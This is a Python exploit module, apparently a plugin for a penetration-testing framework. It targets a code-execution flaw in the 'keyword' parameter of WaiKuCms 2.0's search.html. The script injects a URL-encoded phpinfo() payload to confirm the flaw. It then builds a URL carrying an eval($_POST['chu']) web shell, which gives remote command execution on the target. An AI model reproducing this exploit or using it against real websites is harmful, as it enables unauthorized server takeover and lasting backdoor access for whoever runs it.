#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger

author = "Chu <root@sh3ll.me>"
title = "WaiKuCms 2.0/20130612"
description = "Search.html 参数 keyword 代码执行"
reference = "http://loudong.360.cn/vul/info/id/3971"
options = {
    'target':'http://www.xxoo.com'
}


def exploit(options):
    url = options['target']['current_value']
    urls = [
        url + "/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D",
        url + "/search.html?keyword=%24%7B%40phpinfo%28%29%7D"
    ]

    for i, url in zip(range(1,3), urls):
        logger.process("Testing URL %d..." % i)
        response = http.get(url)
        if "<title>phpinfo()</title>" in response.text:
            logger.success("Exploitable!")
            logger.success("Phpinfo: %s" % url)
            url = url.replace("%24%7B%40phpinfo%28%29%7D",
                              "%24%7B%40eval(%24_POST%5B'chu'%5D)%7D")
            logger.success("WebShell: %s" % url)
            return url
